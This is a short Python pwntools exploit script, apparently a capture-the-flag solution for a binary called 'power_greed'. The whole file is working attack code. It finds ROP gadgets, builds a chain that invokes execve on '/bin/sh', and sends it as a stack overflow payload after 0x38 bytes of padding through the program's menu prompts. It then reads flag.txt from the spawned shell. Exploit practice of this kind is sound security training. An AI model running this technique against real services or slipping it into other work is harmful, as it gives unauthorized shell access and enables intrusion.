#!/usr/bin/env python3


from pwn import *
import sys

context.arch = "amd64"

def exploit(io, elf):
    rop = ROP(elf)
    pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
    pop_rdi = rop.find_gadget(["pop rdi", "pop rbp", "ret"])[0]
    pop_rsi = rop.find_gadget(["pop rsi", "pop rbp", "ret"])[0]
    pop_rdx = p64(0x46f4dc) # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
    syscall = rop.find_gadget(["syscall"])[0]
    binsh = next(elf.search(b"/bin/sh"))

    rop_chain = flat(pop_rdi, binsh, 0,
                     pop_rsi, 0, 0,
                     pop_rdx, 0, 0, 0, 0, 0,
                     pop_rax, 59,
                     syscall)

    payload = b"A"*0x38 + rop_chain

    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"(y/n): ", b"y")
    io.sendlineafter(b"buffer: ", payload)
    sleep(0.2)

    io.sendline(b"cat flag.txt")
    flag = io.recv().decode()
    print(flag)


def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./power_greed")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    elf = ELF("./power_greed")
    exploit(io, elf)


if __name__ == "__main__":
    main()
